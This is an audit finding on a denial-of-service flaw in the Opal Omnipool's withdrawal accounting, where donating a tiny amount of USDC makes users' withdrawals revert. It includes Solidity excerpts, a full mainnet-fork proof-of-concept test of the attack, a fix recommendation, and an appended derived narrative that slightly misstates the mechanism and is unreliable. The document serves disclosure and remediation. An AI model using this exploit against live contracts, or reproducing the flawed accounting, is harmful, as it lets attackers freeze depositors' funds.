---
id: 4827
severity: "High"
---

# Wrong accounting enables attackers to prevent users from withdrawing their funds Submitted by 0xadrii, also found by Chad0

## Description

One of the key features of Opal is liquidity rebalancing, which enables Opal's funds to be distributed among several Aura pools based on a set of preconfigured weights for each pool. When depositing into Opal, the protocol will seek to deploy funds so that weights are kept in the most possible balanced manner, depositing into the Aura pools where the difference between the currently allocated funds and the expected allocated funds is bigger. Withdrawals are performed in the same manner, where Opal seeks to withdraw from the pools that will remain the least imbalanced after performing the withdrawal. This particular vulnerability focuses in the way withdrawals are performed and calculated. When a withdrawal takes place, the _withdrawFromAura() function is called, which will select several pools to withdraw from until the requested withdrawalsRemaining amount is reached. An important parameter in this function is totalUnderlying_, which represents the total amount of underlying held in the pool (both the amount of underlying considering funds deployed in Aura pools, as well as the idle amount of underlying held in the Omnipool). totalUnderlying_ is computed inside the withdraw() function, utilizing the _getTotalAndPerPoolUnderlying() helper:
```solidity
// Omnipool.sol
function withdraw(uint256 _amountOut, uint256 _minUnderlyingReceived) external override {
    // ...
    uint256 underlyingBalanceBefore_ = underlyingToken.balanceOf(address(this));
    (uint256 totalUnderlying_, uint256 allocatedUnderlying_, uint256[] memory allocatedPerPool)
        = _getTotalAndPerPoolUnderlying(underlyingPrice);
    uint256 underlyingToReceive_ = _amountOut.mulDown(_exchangeRate(totalUnderlying_));
    if (underlyingBalanceBefore_ < underlyingToReceive_) {
        uint256 underlyingToWithdraw_ = underlyingToReceive_ - underlyingBalanceBefore_;
        _withdrawFromAura(allocatedUnderlying_, allocatedPerPool, underlyingToWithdraw_);
    }
    //...
}
```
The totalUnderlying_ parameter in _withdrawFromAura() will be set to the allocatedUnderlying_ (computed and returned from _getTotalAndPerPoolUnderlying()), which is simply the total deployed amount in underlying plus the idle amount of underlying (the idle amount of underlying being computed with a regular query to the underlying's balanceOf function). The important fact here is that the idle amount of underlying is considered when passing the totalUnderlying_ parameter to _withdrawFromAura():
```solidity
// Omnipool.sol
function _withdrawFromAura(
    uint256 totalUnderlying_,
    uint256[] memory allocatedPerPool_,
    uint256 underlyingToWithdraw_
) internal {
    uint256 withdrawalsRemaining = underlyingToWithdraw_;
    uint256 totalAfterWithdrawal = totalUnderlying_ - underlyingToWithdraw_;
    uint256[] memory allocatedPerPoolCopy = allocatedPerPool_.copy();
    while (withdrawalsRemaining > 0) {
        (uint256 poolIndex, uint256 maxWithdrawal) =
            _getWithdrawPool(totalAfterWithdrawal, allocatedPerPoolCopy);
        // account for rounding errors
        if (withdrawalsRemaining < maxWithdrawal + 1e2) {
            maxWithdrawal = withdrawalsRemaining;
        }
        UnderlyingPool memory auraPool = underlyingPools[poolIndex];
        uint256 underlyingToWithdraw = _min(withdrawalsRemaining, maxWithdrawal);
        _withdrawFromAuraPool(auraPool, underlyingToWithdraw);
        withdrawalsRemaining -= underlyingToWithdraw;
        allocatedPerPoolCopy[poolIndex] -= underlyingToWithdraw;
    }
}
```
Inside _withdrawFromAura(), the pool selection is obtained from the _getWithdrawPool(), a vital function that will decide which pool to withdraw from. The way _getWithdrawPool() works is by predicting how the future pool's balances would be if the withdrawal was performed on each of the different available pools. Breaking down the process, the following steps take place to determine pool selection:
1. Obtain the current allocation of the pool.
2. Calculate the target allocation given the pool's targetWeight (the percentage from ALL funds in the protocol the pool should have) and the totalUnderlying_.
3. If the target allocation is greater than the current allocation it means no funds will be withdrawn from the pool because the pool already has a balance deficit. Otherwise, the pool will be selected and the amount to be withdrawn from the pool will be computed as the difference between the current allocation and the target allocation (currentAlloc - minBalance_). This computation simply shows the difference between the amount that is currently allocated in the pool, and the amount that should be allocated in it considering the total underlying funds and the withdrawn amount. It is also important to highlight the fact that the transaction will revert if no pool is selected (i.e withdrawPoolIndex remains as -1):
```solidity
// Omnipool.sol
function _getWithdrawPool(uint256 totalUnderlying_, uint256[] memory allocatedPerPool)
    internal
    view
    returns (uint256 poolIndex, uint256 maxWithdrawAmount)
{
    int256 withdrawPoolIndex = -1;
    for (uint256 i; i < allocatedPerPool.length; i++) {
        UnderlyingPool memory pool = underlyingPools[i];
        uint256 currentAlloc = allocatedPerPool[i];
        uint256 targetWeight = pool.targetWeight;
        ...
        uint256 targetAllocation_ = totalUnderlying_.mulDown(targetWeight);
        if (currentAlloc <= targetAllocation_) continue; // @audit-issue [MEDIUM] - It is possible to DoS withdrawals in some situations by donating underlying tokens to the pool
        uint256 minBalance_ = targetAllocation_ - targetAllocation_.mulDown(_getMaxDeviation());
        uint256 maxWithdrawAmount_ = currentAlloc - minBalance_;
        if (maxWithdrawAmount_ <= maxWithdrawAmount) continue;
        maxWithdrawAmount = maxWithdrawAmount_;
        withdrawPoolIndex = int256(i);
    }
    require(withdrawPoolIndex > -1, "error retrieving withdraw pool");
    poolIndex = uint256(withdrawPoolIndex);
}
```
As mentioned before, the problem lies in the fact that the idle amount of underlying tokens is considered when performing withdrawals. An attacker can take advantage of this and send an amount of tokens to the pool in order to increase the totalUnderlying_. Because the target allocation calculations are performed considering both the deployed + the idle amount of underlying, it will be impossible to fully withdraw the requested amount from the pools. This occurs because the idle liquidity considered in totalUnderlying_ makes the targetAllocation computed for each pool always be greater than it should be in reality. What will happen is that the amount requested to be withdrawn (the maxWithdrawAmount_ computed in _getWithdrawPool()) will then be lower than it should. Eventually, all the pools will have been selected to withdraw liquidity from them. However, the withdrawalsRemaining will still be greater than 0 because the pools haven't allowed to withdraw enough funds. In the final call to _getWithdrawPool(), all the pool's currentAlloc will be equal to targetAllocation_, so the if (currentAlloc <= targetAllocation_) continue; condition will hold true and all pools will be skipped, making the withdrawPoolIndex remain as -1 and eventually throwing the "error retrieving withdraw pool" error inside _getWithdrawPool(). Impact: An improper accounting enables any attacker to prevent users from withdrawing by sending a minimal amount of underlying

## Proof of Concept

The following proof of concept shows how an attacker is able to break withdrawals by sending an amount as little as 1 USDC to the omnipool. user then tries to withdraw both their full balance of omnipool LP tokens, as well as a small amount of 2 USDC. In order to reproduce the proof of concept, create a Poc.t.sol file in the test folder from Opal's project. Then, paste the following code inside it:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "src/pools/BPTOracle.sol";
import "src/pools/Omnipool.sol";
import "src/pools/OmnipoolController.sol";
import {IOmnipool} from "src/interfaces/Omnipool/IOmnipool.sol";
import {IOmnipoolController} from "src/interfaces/Omnipool/IOmnipoolController.sol";
import "src/utils/constants.sol";
import "forge-std/console.sol";
import "forge-std/StdStorage.sol";
import {SetupTest} from "../test/setup.t.sol";
import {GemMinterRebalancingReward} from "src/tokenomics/GemMinterRebalancingReward.sol";
contract PocTest is SetupTest {
    using stdStorage for StdStorage;
    //////////////////////////////////////////////////////////////////
    //
    ERRORS
    //
    //////////////////////////////////////////////////////////////////
    error NullAddress();
    error NotAuthorized();
    error CannotSetRewardManagerTwice();
    //////////////////////////////////////////////////////////////////
    //
    STORAGE
    //
    //////////////////////////////////////////////////////////////////
    address[] pools;
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    Omnipool omnipool;
    OmnipoolController controller;
    GemMinterRebalancingReward handler;
    IERC20Metadata token;
    address user;
    address user2;
    address attacker;
    //////////////////////////////////////////////////////////////////
    //
    SETUP
    //
    //////////////////////////////////////////////////////////////////
    function setUp() public override {
        vm.createSelectFork("eth");
        super.setUp();
        deal(address(gem), 0x1234567890123456789012345678901234561234, 1000e18);
        omnipool = new Omnipool(
            address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48),
            address(0xBA12222222228d8Ba445958a75a0704d566BF2C8),
            address(registryContract),
            address(0xB188b1CB84Fb0bA13cb9ee1292769F903A9feC59),
            "Opal USDC Pool",
            "opalUSDC"
        );
        console.log("Omnipool address: %s", address(omnipool));
        controller = new OmnipoolController(address(omnipool), address(registryContract));
        vm.startPrank(opal);
        registryContract.setContract(CONTRACT_OMNIPOOL_CONTROLLER, address(controller));
        registryAccess.addRole(ROLE_OMNIPOOL_CONTROLLER, address(controller));
        handler = new GemMinterRebalancingReward(address(registryContract));
        registryContract.setContract(CONTRACT_GEM_MINTER_REBALANCING_REWARD, address(handler));
        controller.addOmnipool(address(omnipool));
        // For rebalancing rewards
        gem.approve(address(handler), type(uint256).max);
        controller.addRebalancingRewardHandler(address(omnipool), address(handler));
        // USDC / STG
        omnipool.changeUnderlyingPool(
            0,
            0x8bd520Bf5d59F959b25EE7b78811142dDe543134,
            0x3ff3a210e57cfe679d9ad1e9ba6453a716c56a2e0002000000000000000005d5,
            0,
            0,
            0.4e18,
            PoolType.WEIGHTED
        );
        controller.addRebalancingRewardHandler(
            0x8bd520Bf5d59F959b25EE7b78811142dDe543134, address(handler)
        );
        // DAI / USDC / USDT
        omnipool.changeUnderlyingPool(
            1,
            0x2d9d3e3D0655766Aa801Ae0f6dC925db2DF291A1,
            0x79c58f70905f734641735bc61e45c19dd9ad60bc0000000000000000000004e7,
            2,
            1,
            0.3e18,
            PoolType.STABLE
        );
        controller.addRebalancingRewardHandler(
            0x2d9d3e3D0655766Aa801Ae0f6dC925db2DF291A1, address(handler)
        );
        // USDC / DOLA
        omnipool.changeUnderlyingPool(
            2,
            0xb139946D2F0E71b38e2c75d03D87C5E16339d2CD,
            0xff4ce5aaab5a627bf82f4a571ab1ce94aa365ea6000200000000000000000426,
            1,
            0,
            0.3e18,
            PoolType.STABLE
        );
        controller.addRebalancingRewardHandler(
            0xb139946D2F0E71b38e2c75d03D87C5E16339d2CD, address(handler)
        );
        pools.push(address(omnipool));
        vm.startPrank(opal);
        registryAccess.addRole(ROLE_MINT_LP_TOKEN, address(omnipool));
        registryAccess.addRole(ROLE_BURN_LP_TOKEN, address(omnipool));
        // USDC
        oracle.addPriceFeed(
            address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48),
            address(0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6)
        );
        // STG
        oracle.addPriceFeed(
            address(0xAf5191B0De278C7286d6C7CC6ab6BB8A73bA2Cd6),
            address(0x7A9f34a0Aa917D438e9b6E630067062B7F8f6f3d)
        );
        // DAI
        oracle.addPriceFeed(
            address(0x6B175474E89094C44Da98b954EedeAC495271d0F),
            address(0xAed0c38402a5d19df6E4c03F4E2DceD6e29c1ee9)
        );
        // USDT
        oracle.addPriceFeed(
            address(0xdAC17F958D2ee523a2206206994597C13D831ec7),
            address(0x3E7d1eAB13ad0104d2750B8863b489D65364e32D)
        );
        // DOLA
        oracle.addPriceFeed(
            address(0x865377367054516e17014CcdED1e7d814EDC9ce4),
            address(0x3E7d1eAB13ad0104d2750B8863b489D65364e32D)
        );
        // WETH
        oracle.addPriceFeed(
            address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
            address(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419)
        );
        bptOracle.setHeartbeat(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 15 * 86_400);
        bptOracle.setHeartbeat(0xAf5191B0De278C7286d6C7CC6ab6BB8A73bA2Cd6, 15 * 86_400);
        bptOracle.setHeartbeat(0x6B175474E89094C44Da98b954EedeAC495271d0F, 15 * 86_400);
        bptOracle.setHeartbeat(0xdAC17F958D2ee523a2206206994597C13D831ec7, 15 * 86_400);
        bptOracle.setHeartbeat(0x865377367054516e17014CcdED1e7d814EDC9ce4, 15 * 86_400);
        bptOracle.setHeartbeat(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 15 * 86_400);
        // Create users
        user = makeAddr("user");
        user2 = makeAddr("user2");
        attacker = makeAddr("attacker");
        // Deal tokens
        token = IERC20Metadata(omnipool.getUnderlyingToken());
        _dealToken(user, address(token), 100_000 * 10 ** token.decimals());
        _dealToken(user2, address(token), 1000 * 10 ** token.decimals());
        _dealToken(attacker, address(token), 1000 * 10 ** token.decimals());
        vm.startPrank(address(user));
    }
    //////////////////////////////////////////////////////////////////
    //
    POC
    //
    //////////////////////////////////////////////////////////////////
    // Pool with ID 0 -> USDC / STG with 40% weight
    // Pool with ID 1 -> DAI / USDC / USDT with 30% weight
    // Pool with ID 2 -> USDC / DOLA with 30% weight
    function testVuln_wrongAccountingLeadsToDoS() public {
        // Step 1. Perform deposit of 50 USDC with user 1 and 50 USDC with user 2 in the Omnipool
        uint256 depositAmount = 50 * 10 ** token.decimals();
        vm.startPrank(user);
        token.approve(address(omnipool), type(uint256).max);
        omnipool.deposit(depositAmount, 0);
        vm.startPrank(user2);
        token.approve(address(omnipool), type(uint256).max);
        omnipool.deposit(depositAmount, 0);
        // Step 2. Increase pool underlying token amount by directly transferring tokens
        vm.startPrank(attacker);
        token.transfer(address(omnipool), 1 * 10**token.decimals());
        // Step 3. User tries to withdraw. This will always fail because the amount to withdraw (any amount as long as it is smaller than the idle
        // balance of underlying in the pool) can never be fully withdrawn because the pools need to keep some amount to account for the inflated tokens.
        // This prevents users from fully withdrawing all the requested amount. When the pools are finally balanced, there's still some amount that still
        // needs to be withdrawn but can't because of the pools needing to account for the inflation.
        vm.roll(block.number + 100); // roll 100 blocks forward
        vm.startPrank(user);
        uint256 withdrawAmount = IERC20(address(omnipool.lpToken())).balanceOf(user);
        // Trying to withdraw the full balance of LP tokens reverts.
        vm.expectRevert("error retrieving withdraw pool");
        omnipool.withdraw(withdrawAmount, 0); // withdrawAmount
        // An amount greater than the idle balance (1 USDC) also fails because it is as well needed to withdraw from the pools and the issue persists.
        withdrawAmount = 2 * 10 ** token.decimals();
        vm.expectRevert("error retrieving withdraw pool");
        omnipool.withdraw(withdrawAmount, 0); // withdrawAmount
    }
    /// @notice Internal helper function to deal tokens (forge threw a weird issue with `deal`, so this is a workaround)
    function _dealToken(address who, address _token, uint256 amt) internal {
        vm.startPrank(0xD6153F5af5679a75cC85D8974463545181f48772); // mainnet USDC Whale
        IERC20(_token).transfer(who, amt);
        vm.stopPrank();
    }
}
```
Finally, reproduce the poc by executing the following command: forge test --mt testVuln_wrongAccountingLeadsToDoS.

## Recommendation

Consider not accounting for the idle balance held in the pool. If some idle balance is found in the omnipool, a recovery function could be added to obtain the difference between the deposited funds and the idle funds, preventing excess of underlying from being stuck forever in the contract.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an accounting error in the withdrawal path of the Opal Omnipool that allows an attacker to deny all users the ability to withdraw their funds. The root cause is that the function _withdrawFromAura receives a totalUnderlying_ value that includes both the amount of underlying tokens currently deployed in Aura pools and the idle underlying balance held directly by the Omnipool contract. This totalUnderlying_ is then used by _getWithdrawPool to compute a target allocation for each pool as totalUnderlying_ multiplied by the pool's targetWeight. Because the idle balance is added to totalUnderlying_, the target allocation for every pool is artificially inflated. When the actual allocation in a pool (currentAlloc) is compared to this inflated target, the condition currentAlloc <= targetAllocation becomes true for all pools, causing the loop to skip every pool and leaving withdrawPoolIndex at -1. The subsequent require statement reverts with "error retrieving withdraw pool". An attacker can exploit this by sending a minimal amount of the underlying token (e.g., 1 USDC) to the Omnipool, which increases the idle balance and therefore totalUnderlying_. After this tiny donation, any subsequent withdrawal request – even for amounts smaller than the idle balance – cannot be satisfied because the algorithm believes each pool must retain more funds than actually exist. From the user's perspective, a withdrawal transaction that previously would have succeeded now reverts, the user receives no tokens, and their LP‑token balance remains unchanged. Users expect to be able to withdraw their full balance or a small amount, but instead they see a revert error and no change in their holdings. The issue was discovered during a security audit and reproduced with a proof‑of‑concept test that transferred a single USDC to the Omnipool and then attempted withdrawals, which consistently failed with the described revert. The bug is hard to notice because the idle balance is tiny and the logic appears correct at a glance; the rounding‑error guard does not catch the problem, and the failure only manifests when the idle amount is non‑zero. The vulnerability belongs to the class of accounting/logic errors that lead to a denial‑of‑service (DoS) condition by breaking invariant assumptions about fund distribution. To fix the issue, the withdrawal calculation should exclude the idle underlying balance from totalUnderlying_ when determining target allocations, or a dedicated recovery function should be added to allow the protocol to withdraw the excess idle tokens, thereby restoring the ability to satisfy withdrawal requests.
